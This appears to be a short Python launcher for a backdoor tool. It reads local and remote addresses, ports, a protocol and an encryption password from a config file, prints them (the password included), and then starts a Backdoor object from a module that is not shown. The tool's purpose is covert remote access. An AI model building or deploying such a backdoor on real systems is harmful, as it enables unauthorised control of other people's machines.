import configparser
from backdoor import Backdoor

def main():

    config = configparser.ConfigParser()
    config.read('setup.config')

    localIP = config.get('Backdoor', 'localIP')
    localPort = config.get('Backdoor', 'localPort')
    remoteIP = config.get('Backdoor', 'remoteIP')
    remotePort = config.get('Backdoor', 'remotePort')
    protocol = config.get('General', 'protocol')
    password = config.get('Encryption', 'password')
    listenPort = config.get('General', 'listenPort')

    print(localIP, localPort, listenPort, remoteIP, remotePort, protocol, password)
    backdoor = Backdoor(localIP, localPort, listenPort, remoteIP, remotePort, protocol, password)
    backdoor.run()

if __name__ == '__main__':
    main()
